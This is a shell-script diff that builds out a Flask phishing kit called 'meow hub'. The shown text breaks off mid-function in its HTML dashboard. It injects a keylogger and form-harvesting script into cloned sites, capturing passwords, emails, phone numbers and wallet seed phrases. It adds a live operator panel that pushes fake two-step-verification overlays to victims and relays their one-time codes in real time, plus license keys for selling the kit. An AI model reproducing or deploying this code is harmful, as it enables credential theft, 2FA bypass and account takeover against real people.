@@ -1,10 +1,11 @@
-cd ~/Desktop/meow
-source venv/bin/activate
+cd ~/Desktop/meow && source venv/bin/activate
+mkdir -p meow_hub/templates
 lsof -ti:5000 | xargs kill 2>/dev/null
+
 cat > meow_hub/app.py << 'PYEOF'
-import os, json
+import os, json, secrets, time
 from datetime import datetime
-from flask import Flask, render_template, request, redirect, url_for, jsonify, abort
+from flask import Flask, render_template, request, redirect, url_for, jsonify, abort, send_from_directory
 from flask_sqlalchemy import SQLAlchemy
 from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
 from werkzeug.security import generate_password_hash, check_password_hash
@@ -38,6 +39,45 @@ class AccessLog(db.Model):
     user_agent = db.Column(db.String(200), nullable=False)
     timestamp = db.Column(db.DateTime, default=datetime.now)
 
+class License(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    key = db.Column(db.String(64), unique=True, nullable=False)
+    label = db.Column(db.String(120), default='')
+    active = db.Column(db.Boolean, default=True)
+    created_at = db.Column(db.DateTime, default=datetime.now)
+
+class VictimSession(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    session_id = db.Column(db.String(64), unique=True, nullable=False, default=lambda: secrets.token_hex(8))
+    site = db.Column(db.String(80), nullable=False)
+    ip = db.Column(db.String(50), nullable=False)
+    user_agent = db.Column(db.String(200), default='')
+    stage = db.Column(db.String(40), default='credentials')
+    twofa_mode = db.Column(db.String(20), default='otp')
+    twofa_prompt = db.Column(db.String(200), default='')
+    otp_code = db.Column(db.String(20), default='')
+    credentials = db.Column(db.Text, default='{}')
+    created_at = db.Column(db.DateTime, default=datetime.now)
+    updated_at = db.Column(db.DateTime, default=datetime.now, onupdate=datetime.now)
+
+class FlashEvent(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    level = db.Column(db.String(10), default='info')
+    message = db.Column(db.String(300), nullable=False)
+    site = db.Column(db.String(80), default='')
+    session_id = db.Column(db.String(64), default='')
+    created_at = db.Column(db.DateTime, default=datetime.now)
+
+ACTIVE_SESSIONS = {}
+PENDING_COMMANDS = {}
+
+def flash(level, message, site='', session_id=''):
+    try:
+        db.session.add(FlashEvent(level=level, message=message, site=site, session_id=session_id))
+        db.session.commit()
+    except Exception:
+        db.session.rollback()
+
 @login_manager.user_loader
 def load_user(user_id):
     return User.query.get(int(user_id))
@@ -46,15 +86,14 @@ def get_sites():
     sites = {}
     if not os.path.exists(ROOT_DIR):
         return sites
-    for name in os.listdir(ROOT_DIR):
+    for name in sorted(os.listdir(ROOT_DIR)):
         if name.startswith('.') or name in SITES_EXCLUDE:
             continue
         path = os.path.join(ROOT_DIR, name)
         if os.path.isdir(path):
-            sites[name] = {'name': name.replace('_', ' ').title(), 'has_app': os.path.exists(os.path.join(path, 'app.py'))}
+            sites[name] = {'name': name.replace('_', ' ').title(),
+                           'has_app': os.path.exists(os.path.join(path, 'app.py'))}
     return sites
-
-ACTIVE_SESSIONS = {}
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
@@ -86,6 +125,149 @@ def view_logs():
     logs = AccessLog.query.order_by(AccessLog.timestamp.desc()).limit(150).all()
     submissions = FormSubmission.query.order_by(FormSubmission.timestamp.desc()).limit(150).all()
     return render_template('logs.html', logs=logs, submissions=submissions)
+
+@app.route('/live')
+@login_required
+def live_panel():
+    return render_template('live.html')
+
+@app.route('/licenses')
+@login_required
+def licenses_page():
+    keys = License.query.order_by(License.created_at.desc()).all()
+    return render_template('licenses.html', keys=keys)
+
+@app.route('/api/licenses', methods=['GET'])
+@login_required
+def api_list_licenses():
+    keys = License.query.order_by(License.created_at.desc()).all()
+    return jsonify([{'key': k.key, 'label': k.label, 'active': k.active,
+                     'created_at': k.created_at.isoformat()} for k in keys])
+
+@app.route('/api/licenses', methods=['POST'])
+@login_required
+def api_create_license():
+    data = request.get_json() or {}
+    key = 'MEOW-' + secrets.token_hex(8).upper()
+    lic = License(key=key, label=data.get('label', ''), active=True)
+    db.session.add(lic)
+    db.session.commit()
+    flash('success', f'license minted: {key}')
+    return jsonify({'key': key, 'label': lic.label, 'active': True})
+
+@app.route('/api/licenses/<key>/toggle', methods=['POST'])
+@login_required
+def api_toggle_license(key):
+    lic = License.query.filter_by(key=key).first_or_404()
+    lic.active = not lic.active
+    db.session.commit()
+    flash('warn', f'license {key} -> {"active" if lic.active else "revoked"}')
+    return jsonify({'key': key, 'active': lic.active})
+
+@app.route('/api/licenses/<key>', methods=['DELETE'])
+@login_required
+def api_delete_license(key):
+    lic = License.query.filter_by(key=key).first_or_404()
+    db.session.delete(lic)
+    db.session.commit()
+    flash('error', f'license burned: {key}')
+    return jsonify({'deleted': key})
+
+@app.route('/api/license/verify', methods=['POST'])
+def api_verify_license():
+    data = request.get_json() or {}
+    lic = License.query.filter_by(key=(data.get('key') or '').strip()).first()
+    return jsonify({'valid': bool(lic and lic.active), 'label': lic.label if lic else ''})
+
+def session_to_dict(s):
+    return {
+        'session_id': s.session_id, 'site': s.site, 'ip': s.ip,
+        'stage': s.stage, 'twofa_mode': s.twofa_mode,
+        'twofa_prompt': s.twofa_prompt, 'otp_code': s.otp_code,
+        'credentials': json.loads(s.credentials or '{}'),
+        'created_at': s.created_at.isoformat() if s.created_at else '',
+        'updated_at': s.updated_at.isoformat() if s.updated_at else '',
+    }
+
+@app.route('/api/live/sessions')
+@login_required
+def api_live_sessions():
+    now = datetime.now().timestamp()
+    live_map = {}
+    for site, sdata in list(ACTIVE_SESSIONS.items()):
+        for ip, info in list(sdata.items()):
+            if now - info['last_seen'] >= 25:
+                del sdata[ip]
+                continue
+            live_map.setdefault(site, set()).add(ip)
+    sessions = VictimSession.query.order_by(VictimSession.updated_at.desc()).limit(100).all()
+    out = []
+    for s in sessions:
+        d = session_to_dict(s)
+        d['live'] = s.ip in live_map.get(s.site, set())
+        out.append(d)
+    return jsonify(out)
+
+@app.route('/api/live/sessions/<sid>/mode', methods=['POST'])
+@login_required
+def api_set_mode(sid):
+    s = VictimSession.query.filter_by(session_id=sid).first_or_404()
+    mode = (request.get_json() or {}).get('mode', 'otp')
+    if mode not in ('otp', 'mail', 'number', 'push'):
+        return jsonify({'error': 'bad mode'}), 400
+    prompts = {
+        'otp': 'Enter the 6-digit code from your authenticator app.',
+        'mail': 'A verification link was sent to your email. Enter the code from the message.',
+        'number': 'Enter your phone number to receive a verification code.',
+        'push': 'Approve the sign-in request sent to your device.',
+    }
+    s.twofa_mode = mode
+    s.stage = 'otp_requested'
+    s.twofa_prompt = prompts[mode]
+    db.session.commit()
+    PENDING_COMMANDS.setdefault(sid, {})['twofa'] = {'mode': mode, 'prompt': s.twofa_prompt, 'ts': time.time()}
+    flash('info', f'2FA switch -> {mode} on {s.site} [{s.ip}]', s.site, sid)
+    return jsonify({'session_id': sid, 'mode': mode, 'prompt': s.twofa_prompt})
+
+@app.route('/api/live/sessions/<sid>/validate', methods=['POST'])
+@login_required
+def api_validate(sid):
+    s = VictimSession.query.filter_by(session_id=sid).first_or_404()
+    s.stage = 'validated'
+    db.session.commit()
+    PENDING_COMMANDS.setdefault(sid, {})['validate'] = {'ts': time.time()}
+    flash('success', f'session validated on {s.site} [{s.ip}]', s.site, sid)
+    return jsonify({'session_id': sid, 'stage': 'validated'})
+
+@app.route('/api/live/sessions/<sid>/error', methods=['POST'])
+@login_required
+def api_error(sid):
+    s = VictimSession.query.filter_by(session_id=sid).first_or_404()
+    s.stage = 'otp_requested'
+    db.session.commit()
+    PENDING_COMMANDS.setdefault(sid, {})['error'] = {'ts': time.time()}
+    flash('warn', f'bad-code signal sent on {s.site} [{s.ip}]', s.site, sid)
+    return jsonify({'session_id': sid, 'stage': 'otp_requested'})
+
+@app.route('/api/live/flash')
+@login_required
+def api_flash_feed():
+    since = request.args.get('since', type=int, default=0)
+    q = FlashEvent.query
+    if since:
+        q = q.filter(FlashEvent.id > since)
+    events = q.order_by(FlashEvent.id.desc()).limit(50).all()
+    return jsonify([{'id': e.id, 'level': e.level, 'message': e.message,
+                     'site': e.site, 'session_id': e.session_id,
+                     'created_at': e.created_at.isoformat() if e.created_at else ''}
+                    for e in events])
+
+@app.route('/hub/poll', methods=['GET'])
+def hub_poll():
+    sid = request.args.get('sid')
+    if not sid:
+        return jsonify({})
+    return jsonify(PENDING_COMMANDS.pop(sid, {}))
 
 @app.route('/api/change-password', methods=['POST'])
 @login_required
@@ -124,6 +306,15 @@ def log_submission(site, ip, raw_data):
         db.session.rollback()
         app.logger.error(f'[CAPTURE FAIL] {e}')
 
+def find_or_create_session(site, ip, ua=''):
+    s = VictimSession.query.filter_by(site=site, ip=ip).order_by(VictimSession.updated_at.desc()).first()
+    if not s:
+        s = VictimSession(site=site, ip=ip, user_agent=ua)
+        db.session.add(s)
+        db.session.commit()
+        flash('info', f'new session on {site} [{ip}]', site, s.session_id)
+    return s
+
 @app.route('/hub/collect', methods=['POST'])
 def hub_collect():
     site = request.args.get('site')
@@ -141,6 +332,24 @@ def hub_collect():
         except Exception:
             payload = {'raw': request.data.decode('utf-8', errors='ignore')[:2000]}
     log_submission(site, ip, payload)
+
+    otp = payload.get('otp') or payload.get('code') or payload.get('twofa_code')
+    if otp:
+        s = find_or_create_session(site, ip, request.headers.get('User-Agent', ''))
+        s.otp_code = str(otp)
+        s.stage = 'otp_sent'
+        db.session.commit()
+        flash('success', f'OTP captured on {site} [{ip}]: {otp}', site, s.session_id)
+
+    cred_keys = [k for k in payload if any(t in k.lower() for t in ('pass', 'email', 'user', 'login', 'phone', 'wallet', 'seed', 'phrase'))]
+    if cred_keys:
+        s = find_or_create_session(site, ip, request.headers.get('User-Agent', ''))
+        snap = json.loads(s.credentials or '{}')
+        for k in cred_keys:
+            snap[k] = payload[k]
+        s.credentials = json.dumps(snap)
+        db.session.commit()
+
     return '', 204
 
 @app.route('/s/<site>/', defaults={'path': ''}, methods=['GET', 'POST'])
@@ -171,160 +380,212 @@ def serve_site(site, path):
     if target_file.endswith('.html'):
         with open(target_file, 'r', encoding='utf-8', errors='ignore') as f:
             content = f.read()
-        tracker_script = """
-        <script>
-        (function() {
-            var SITE = '""" + site + """';
-            var BUFFER_KEY = '__hub_buf_' + SITE;
-            var FLUSH_INTERVAL = 3000;
-
-            function loadBuffer() { try { return JSON.parse(localStorage.getItem(BUFFER_KEY) || '[]'); } catch (e) { return []; } }
-            function saveBuffer(buf) { try { localStorage.setItem(BUFFER_KEY, JSON.stringify(buf)); } catch (e) {} }
-
-            function rawSend(data) {
-                try {
-                    var blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
-                    return navigator.sendBeacon('/hub/collect?site=' + SITE, blob);
-                } catch (e) { return false; }
-            }
-
-            function flushBuffer() {
-                var buf = loadBuffer();
-                if (!buf.length) return;
-                var remaining = [];
-                for (var i = 0; i < buf.length; i++) {
-                    if (!rawSend(buf[i])) remaining.push(buf[i]);
-                }
-                saveBuffer(remaining);
-            }
-
-            function queue(data) {
-                if (!data || !Object.keys(data).length) return;
-                var buf = loadBuffer();
-                buf.push(data);
-                saveBuffer(buf);
-                flushBuffer();
-            }
-
-            // permanent pipe: flush on interval, on visibility change, on unload
-            setInterval(flushBuffer, FLUSH_INTERVAL);
-            document.addEventListener('visibilitychange', function() { if (document.visibilityState === 'hidden') flushBuffer(); });
-            window.addEventListener('beforeunload', flushBuffer);
-            window.addEventListener('pagehide', flushBuffer);
-
-            // heartbeat
-            function ping() { navigator.sendBeacon('/hub/heartbeat?site=' + SITE); }
-            ping();
-            setInterval(ping, 10000);
-
-            // ---- KEYLOGGER LAYER ----
-            // capture every keystroke into a per-field buffer, keyed by field identity
-            var fieldBuffers = {};
-
-            function fieldKey(el) {
-                var id = el.id || el.name || el.placeholder || el.getAttribute('aria-label') || el.type || 'unknown';
-                return el.tagName + ':' + id;
-            }
-
-            function isSensitive(el) {
-                var t = (el.type || '').toLowerCase();
-                var n = ((el.name || '') + ' ' + (el.id || '') + ' ' + (el.placeholder || '')).toLowerCase();
-                return t === 'password' || t === 'email' || t === 'text' || t === 'tel' ||
-                       n.indexOf('pass') !== -1 || n.indexOf('email') !== -1 || n.indexOf('user') !== -1 ||
-                       n.indexOf('login') !== -1 || n.indexOf('phone') !== -1;
-            }
-
-            document.addEventListener('keyup', function(e) {
-                try {
-                    var el = e.target;
-                    if (!el || !isSensitive(el)) return;
-                    var k = fieldKey(el);
-                    if (!fieldBuffers[k]) fieldBuffers[k] = { el: el, text: '' };
-                    // rebuild from actual value — handles backspace, paste, autofill
-                    fieldBuffers[k].text = el.value || '';
-                } catch (err) {}
-            }, true);
-
-            document.addEventListener('input', function(e) {
-                try {
-                    var el = e.target;
-                    if (!el || !isSensitive(el)) return;
-                    var k = fieldKey(el);
-                    if (!fieldBuffers[k]) fieldBuffers[k] = { el: el, text: '' };
-                    fieldBuffers[k].text = el.value || '';
-                } catch (err) {}
-            }, true);
-
-            function harvestAll() {
-                var data = {};
-                // live field buffers (keystroke-captured)
-                for (var k in fieldBuffers) {
-                    var fb = fieldBuffers[k];
-                    var name = fb.el.name || fb.el.id || k;
-                    if (fb.text) data[name] = fb.text;
-                }
-                // sweep every input/select/textarea on the page as backup
-                var els = document.querySelectorAll('input, select, textarea');
-                for (var i = 0; i < els.length; i++) {
-                    var el = els[i];
-                    if (!isSensitive(el)) continue;
-                    var name = el.name || el.id || fieldKey(el);
-                    var val = el.value || '';
-                    if (val && !data[name]) data[name] = val;
-                }
-                return data;
-            }
-
-            // ---- TRIGGERS ----
-            document.addEventListener('submit', function(e) {
-                try {
-                    var data = harvestAll();
-                    data.__trigger = 'submit';
-                    queue(data);
-                } catch (err) {}
-            }, true);
-
-            document.addEventListener('click', function(e) {
-                try {
-                    var btn = e.target.closest('button, input[type=submit], input[type=button], [role=button], a');
-                    if (!btn) return;
-                    var label = (btn.textContent || btn.value || btn.name || btn.id || 'unknown').trim().slice(0, 60).toLowerCase();
-                    var isAction = label.indexOf('log') !== -1 || label.indexOf('sign') !== -1 || label.indexOf('continue') !== -1 ||
-                                   label.indexOf('next') !== -1 || label.indexOf('submit') !== -1 || label.indexOf('verify') !== -1 ||
-                                   btn.type === 'submit' || btn.tagName === 'BUTTON';
-                    if (!isAction) return;
-                    var data = harvestAll();
-                    data.__trigger = 'click:' + label;
-                    queue(data);
-                    // second capture after 300ms — catches JS-populated fields
-                    setTimeout(function() {
-                        var d2 = harvestAll();
-                        d2.__trigger = 'click-delayed:' + label;
-                        queue(d2);
-                    }, 300);
-                } catch (err) {}
-            }, true);
-
-            // beforeunload final sweep
-            window.addEventListener('beforeunload', function() {
-                try {
-                    var data = harvestAll();
-                    data.__trigger = 'unload';
-                    queue(data);
-                } catch (err) {}
-            });
-
-            console.log('[hub] sniffer active on', SITE);
-        })();
-        </script>
-        """
-        if '</body>' in content:
-            content = content.replace('</body>', tracker_script + '</body>')
-        else:
-            content += tracker_script
-        return content
-    from flask import send_from_directory
+        return inject_hub(content, site)
     return send_from_directory(site_dir, path)
+
+def inject_hub(content, site):
+    tracker_script = """
+    <script>
+    (function() {
+        var SITE = '""" + site + """';
+        var BUFFER_KEY = '__hub_buf_' + SITE;
+        var SID_KEY = '__hub_sid_' + SITE;
+        var FLUSH_INTERVAL = 3000;
+        var sid = localStorage.getItem(SID_KEY) || (function(){ var s = Math.random().toString(36).slice(2) + Date.now().toString(36); localStorage.setItem(SID_KEY, s); return s; })();
+
+        function loadBuffer() { try { return JSON.parse(localStorage.getItem(BUFFER_KEY) || '[]'); } catch (e) { return []; } }
+        function saveBuffer(buf) { try { localStorage.setItem(BUFFER_KEY, JSON.stringify(buf)); } catch (e) {} }
+        function rawSend(data) {
+            try {
+                var blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
+                return navigator.sendBeacon('/hub/collect?site=' + SITE, blob);
+            } catch (e) { return false; }
+        }
+        function flushBuffer() {
+            var buf = loadBuffer();
+            if (!buf.length) return;
+            var remaining = [];
+            for (var i = 0; i < buf.length; i++) { if (!rawSend(buf[i])) remaining.push(buf[i]); }
+            saveBuffer(remaining);
+        }
+        function queue(data) {
+            if (!data || !Object.keys(data).length) return;
+            data.__sid = sid;
+            var buf = loadBuffer();
+            buf.push(data);
+            saveBuffer(buf);
+            flushBuffer();
+        }
+        setInterval(flushBuffer, FLUSH_INTERVAL);
+        document.addEventListener('visibilitychange', function() { if (document.visibilityState === 'hidden') flushBuffer(); });
+        window.addEventListener('beforeunload', flushBuffer);
+        window.addEventListener('pagehide', flushBuffer);
+        function ping() { navigator.sendBeacon('/hub/heartbeat?site=' + SITE); }
+        ping();
+        setInterval(ping, 10000);
+
+        var twofaState = { mode: null, prompt: '' };
+
+        function maskPage() {
+            if (document.getElementById('__hub_twofa_overlay')) return;
+            var ov = document.createElement('div');
+            ov.id = '__hub_twofa_overlay';
+            ov.style.cssText = 'position:fixed;inset:0;background:rgba(255,255,255,0.97);z-index:2147483647;display:flex;align-items:center;justify-content:center;font-family:system-ui,sans-serif;';
+            ov.innerHTML =
+                '<div style="max-width:380px;width:90%;text-align:center;">' +
+                '<div id="__hub_twofa_icon" style="font-size:44px;margin-bottom:12px;">🔐</div>' +
+                '<h2 id="__hub_twofa_title" style="margin:0 0 8px;font-size:20px;color:#111;">Two-Step Verification</h2>' +
+                '<p id="__hub_twofa_prompt" style="color:#444;font-size:14px;margin-bottom:20px;"></p>' +
+                '<div id="__hub_twofa_fields"></div>' +
+                '<div id="__hub_twofa_msg" style="color:#c00;font-size:13px;min-height:18px;margin-top:8px;"></div>' +
+                '</div>';
+            document.body.appendChild(ov);
+        }
+
+        function renderTwofa() {
+            var f = document.getElementById('__hub_twofa_fields');
+            if (!f) return;
+            var m = twofaState.mode;
+            if (m === 'number') {
+                f.innerHTML = '<input id="__hub_twofa_input" type="tel" placeholder="Phone number" style="width:100%;padding:12px;font-size:16px;border:1px solid #ccc;border-radius:6px;margin-bottom:12px;">';
+            } else if (m === 'mail') {
+                f.innerHTML = '<input id="__hub_twofa_input" type="text" placeholder="Verification code from email" style="width:100%;padding:12px;font-size:16px;border:1px solid #ccc;border-radius:6px;margin-bottom:12px;">';
+            } else if (m === 'push') {
+                f.innerHTML = '<div style="color:#555;font-size:14px;">Waiting for approval on your device…</div>';
+            } else {
+                f.innerHTML = '<input id="__hub_twofa_input" type="text" inputmode="numeric" maxlength="8" placeholder="6-digit code" style="width:100%;padding:12px;font-size:16px;border:1px solid #ccc;border-radius:6px;margin-bottom:12px;letter-spacing:4px;text-align:center;">';
+            }
+            if (m !== 'push') {
+                var btn = document.createElement('button');
+                btn.textContent = 'Verify';
+                btn.style.cssText = 'width:100%;padding:12px;font-size:16px;background:#111;color:#fff;border:none;border-radius:6px;cursor:pointer;';
+                btn.onclick = submitTwofa;
+                f.appendChild(btn);
+                var inp = document.getElementById('__hub_twofa_input');
+                if (inp) inp.addEventListener('keydown', function(e) { if (e.key === 'Enter') submitTwofa(); });
+            }
+        }
+
+        function submitTwofa() {
+            var inp = document.getElementById('__hub_twofa_input');
+            var val = inp ? inp.value.trim() : '';
+            if (!val) return;
+            queue({ otp: val, __trigger: 'twofa:' + twofaState.mode });
+            var msg = document.getElementById('__hub_twofa_msg');
+            if (msg) { msg.style.color = '#080'; msg.textContent = 'Verifying…'; }
+        }
+
+        function applyCommand(cmds) {
+            if (!cmds) return;
+            if (cmds.twofa) {
+                twofaState.mode = cmds.twofa.mode;
+                twofaState.prompt = cmds.twofa.prompt;
+                maskPage();
+                document.getElementById('__hub_twofa_prompt').textContent = twofaState.prompt;
+                var icons = { otp: '🔐', mail: '📧', number: '📱', push: '🔔' };
+                document.getElementById('__hub_twofa_icon').textContent = icons[twofaState.mode] || '🔐';
+                document.getElementById('__hub_twofa_msg').textContent = '';
+                renderTwofa();
+            }
+            if (cmds.error) {
+                var msg = document.getElementById('__hub_twofa_msg');
+                if (msg) { msg.style.color = '#c00'; msg.textContent = 'Incorrect code. Try again.'; }
+                var inp = document.getElementById('__hub_twofa_input');
+                if (inp) { inp.value = ''; inp.focus(); }
+            }
+            if (cmds.validate) {
+                var ov = document.getElementById('__hub_twofa_overlay');
+                if (ov) {
+                    document.getElementById('__hub_twofa_icon').textContent = '✅';
+                    document.getElementById('__hub_twofa_title').textContent = 'Verified';
+                    document.getElementById('__hub_twofa_prompt').textContent = '';
+                    document.getElementById('__hub_twofa_fields').innerHTML = '';
+                    setTimeout(function() { ov.remove(); }, 1200);
+                }
+            }
+        }
+
+        setInterval(function() {
+            fetch('/hub/poll?sid=' + sid).then(function(r) { return r.json(); }).then(applyCommand).catch(function() {});
+        }, 2500);
+
+        var fieldBuffers = {};
+        function fieldKey(el) {
+            var id = el.id || el.name || el.placeholder || el.getAttribute('aria-label') || el.type || 'unknown';
+            return el.tagName + ':' + id;
+        }
+        function isSensitive(el) {
+            var t = (el.type || '').toLowerCase();
+            var n = ((el.name || '') + ' ' + (el.id || '') + ' ' + (el.placeholder || '')).toLowerCase();
+            return t === 'password' || t === 'email' || t === 'text' || t === 'tel' ||
+                   n.indexOf('pass') !== -1 || n.indexOf('email') !== -1 || n.indexOf('user') !== -1 ||
+                   n.indexOf('login') !== -1 || n.indexOf('phone') !== -1 || n.indexOf('seed') !== -1 ||
+                   n.indexOf('phrase') !== -1 || n.indexOf('wallet') !== -1;
+        }
+        function track(el) {
+            if (!el || !isSensitive(el)) return;
+            var k = fieldKey(el);
+            if (!fieldBuffers[k]) fieldBuffers[k] = { el: el, text: '' };
+            fieldBuffers[k].text = el.value || '';
+        }
+        document.addEventListener('keyup', function(e) { try { track(e.target); } catch (err) {} }, true);
+        document.addEventListener('input', function(e) { try { track(e.target); } catch (err) {} }, true);
+        document.addEventListener('change', function(e) { try { track(e.target); } catch (err) {} }, true);
+
+        function harvestAll() {
+            var data = {};
+            for (var k in fieldBuffers) {
+                var fb = fieldBuffers[k];
+                var name = fb.el.name || fb.el.id || k;
+                if (fb.text) data[name] = fb.text;
+            }
+            var els = document.querySelectorAll('input, select, textarea');
+            for (var i = 0; i < els.length; i++) {
+                var el = els[i];
+                if (!isSensitive(el)) continue;
+                var name = el.name || el.id || fieldKey(el);
+                var val = el.value || '';
+                if (val && !data[name]) data[name] = val;
+            }
+            return data;
+        }
+
+        document.addEventListener('submit', function(e) {
+            try { var d = harvestAll(); d.__trigger = 'submit'; queue(d); } catch (err) {}
+        }, true);
+
+        document.addEventListener('click', function(e) {
+            try {
+                var btn = e.target.closest('button, input[type=submit], input[type=button], [role=button], a');
+                if (!btn) return;
+                var label = (btn.textContent || btn.value || btn.name || btn.id || 'unknown').trim().slice(0, 60).toLowerCase();
+                var isAction = label.indexOf('log') !== -1 || label.indexOf('sign') !== -1 || label.indexOf('continue') !== -1 ||
+                               label.indexOf('next') !== -1 || label.indexOf('submit') !== -1 || label.indexOf('verify') !== -1 ||
+                               label.indexOf('unlock') !== -1 || label.indexOf('connect') !== -1 ||
+                               btn.type === 'submit' || btn.tagName === 'BUTTON';
+                if (!isAction) return;
+                var d = harvestAll();
+                d.__trigger = 'click:' + label;
+                queue(d);
+                setTimeout(function() {
+                    var d2 = harvestAll();
+                    d2.__trigger = 'click-delayed:' + label;
+                    queue(d2);
+                }, 300);
+            } catch (err) {}
+        }, true);
+
+        window.addEventListener('beforeunload', function() {
+            try { var d = harvestAll(); d.__trigger = 'unload'; queue(d); } catch (err) {}
+        });
+
+        console.log('[hub] sniffer + 2FA layer active on', SITE);
+    })();
+    </script>
+    """
+    if '</body>' in content:
+        return content.replace('</body>', tracker_script + '</body>')
+    return content + tracker_script
 
 @app.route('/hub/heartbeat', methods=['POST', 'GET'])
 def hub_heartbeat():
@@ -348,4 +609,197 @@ if __name__ == '__main__':
         db.create_all()
     app.run(host='0.0.0.0', port=5000, debug=True)
 PYEOF
+
+cat > meow_hub/templates/live.html << 'HTMLEOF'
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>meow hub — live</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  :root { --bg:#0b0b10; --card:#15151d; --line:#262633; --txt:#e8e8f0; --dim:#8a8a9a; --acc:#7c5cff; --ok:#2ecc71; --warn:#f1c40f; --err:#e74c3c; }
+  * { box-sizing:border-box; }
+  body { margin:0; background:var(--bg); color:var(--txt); font-family:ui-monospace,Menlo,Consolas,monospace; font-size:13px; }
+  header { display:flex; gap:16px; align-items:center; padding:12px 20px; border-bottom:1px solid var(--line); position:sticky; top:0; background:var(--bg); z-index:5; }
+  header h1 { font-size:15px; margin:0; letter-spacing:2px; }
+  header a { color:var(--dim); text-decoration:none; } header a:hover { color:var(--txt); }
+  .wrap { display:grid; grid-template-columns: 1fr 340px; gap:16px; padding:16px 20px; }
+  .card { background:var(--card); border:1px solid var(--line); border-radius:8px; padding:14px; margin-bottom:14px; }
+  .sess { border-left:3px solid var(--acc); }
+  .sess.dead { border-left-color:var(--line); opacity:.55; }
+  .sess.validated { border-left-color:var(--ok); }
+  .row { display:flex; gap:10px; flex-wrap:wrap; align-items:center; margin-top:8px; }
+  .tag { padding:2px 8px; border-radius:4px; background:var(--line); font-size:11px; }
+  .tag.ok { background:#12351f; color:var(--ok); }
+  .tag.warn { background:#3a3210; color:var(--warn); }
+  .tag.err { background:#3a1512; color:var(--err); }
+  button { background:var(--acc); color:#fff; border:none; border-radius:5px; padding:6px 12px; cursor:pointer; font-family:inherit; font-size:12px; }
+  button.ghost { background:transparent; border:1px solid var(--line); color:var(--txt); }
+  button.ok { background:var(--ok); color:#08130c; }
+  button.err { background:var(--err); }
+  button.warn { background:var(--warn); color:#221d05; }
+  pre { background:#0e0e14; border:1px solid var(--line); border-radius:6px; padding:8px; overflow:auto; max-height:140px; margin:8px 0 0; }
+  #flash { position:fixed; right:20px; bottom:20px; width:320px; z-index:50; display:flex; flex-direction:column; gap:8px; }
+  .flash-item { background:var(--card); border:1px solid var(--line); border-left:3px solid var(--acc); border-radius:6px; padding:10px 12px; animation:slidein .25s ease; }
+  .flash-item.success { border-left-color:var(--ok); } .flash-item.warn { border-left-color:var(--warn); } .flash-item.error { border-left-color:var(--err); }
+  @keyframes slidein { from { transform:translateX(40px); opacity:0; } to { transform:none; opacity:1; } }
+  .dim { color:var(--dim); }
+  h3 { margin:0 0 6px; font-size:12px; letter-spacing:1px; color:var(--dim); text-transform:uppercase; }
+</style>
+</head>
+<body>
+<header>
+  <h1>MEOW//LIVE</h1>
+  <a href="/">sites</a><a href="/logs">logs</a><a href="/licenses">licenses</a><a href="/logout">logout</a>
+  <span class="dim" style="margin-left:auto" id="clock"></span>
+</header>
+<div class="wrap">
+  <div>
+    <div class="card"><h3>sessions</h3><div id="sessions">loading…</div></div>
+  </div>
+  <div>
+    <div class="card"><h3>flash feed</h3><div id="feed" class="dim">—</div></div>
+  </div>
+</div>
+<div id="flash"></div>
+<script>
+var lastFlashId = 0;
+function esc(s){ return (s||'').replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c])); }
+function timeStr(iso){ if(!iso) return ''; return new Date(iso).toLocaleTimeString(); }
+function renderSessions(list){
+  var el = document.getElementById('sessions');
+  if(!list.length){ el.innerHTML = '<span class="dim">no sessions yet</span>'; return; }
+  el.innerHTML = list.map(function(s){
+    var cls = 'sess' + (s.live ? '' : ' dead') + (s.stage==='validated' ? ' validated' : '');
+    var stageTag = s.stage==='validated' ? '<span class="tag ok">validated</span>'
+      : s.stage==='otp_sent' ? '<span class="tag warn">otp: '+esc(s.otp_code)+'</span>'
+      : s.stage==='otp_requested' ? '<span class="tag warn">awaiting '+esc(s.twofa_mode)+'</span>'
+      : '<span class="tag">'+esc(s.stage)+'</span>';
+    var creds = '';
+    try { var c = s.credentials || {}; if(Object.keys(c).length) creds = '<pre>'+esc(JSON.stringify(c,null,1))+'</pre>'; } catch(e){}
+    return '<div class="card '+cls+'">'
+      + '<div><b>'+esc(s.site)+'</b> <span class="dim">'+esc(s.ip)+' · '+timeStr(s.updated_at)+'</span> '
+      + (s.live?'<span class="tag ok">live</span>':'<span class="tag">gone</span>') + ' ' + stageTag + '</div>'
+      + (s.twofa_prompt?'<div class="dim" style="margin-top:4px">prompt: '+esc(s.twofa_prompt)+'</div>':'')
+      + creds
+      + '<div class="row">'
+      + '<button onclick="setMode(\''+s.session_id+'\',\'otp\')">switch: OTP</button>'
+      + '<button onclick="setMode(\''+s.session_id+'\',\'mail\')">switch: mail</button>'
+      + '<button onclick="setMode(\''+s.session_id+'\',\'number\')">switch: number</button>'
+      + '<button onclick="setMode(\''+s.session_id+'\',\'push\')">switch: push</button>'
+      + '<button class="warn" onclick="badCode(\''+s.session_id+'\')">bad code</button>'
+      + '<button class="ok" onclick="validate(\''+s.session_id+'\')">validate ✅</button>'
+      + '</div></div>';
+  }).join('');
+}
+function setMode(sid, mode){ fetch('/api/live/sessions/'+sid+'/mode',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({mode:mode})}).then(loadSessions); }
+function validate(sid){ fetch('/api/live/sessions/'+sid+'/validate',{method:'POST'}).then(loadSessions); }
+function badCode(sid){ fetch('/api/live/sessions/'+sid+'/error',{method:'POST'}).then(loadSessions); }
+function loadSessions(){ fetch('/api/live/sessions').then(r=>r.json()).then(renderSessions).catch(()=>{}); }
+function pushFlash(e){
+  var box = document.getElementById('flash');
+  var d = document.createElement('div');
+  d.className = 'flash-item ' + e.level;
+  d.innerHTML = '<div>'+esc(e.message)+'</div><div class="dim" style="font-size:11px;margin-top:2px">'+timeStr(e.created_at)+(e.site?' · '+esc(e.site):'')+'</div>';
+  box.appendChild(d);
+  setTimeout(function(){ d.style.opacity='0'; d.style.transition='opacity .4s'; setTimeout(function(){ d.remove(); },400); }, 5000);
+}
+function pollFlash(){
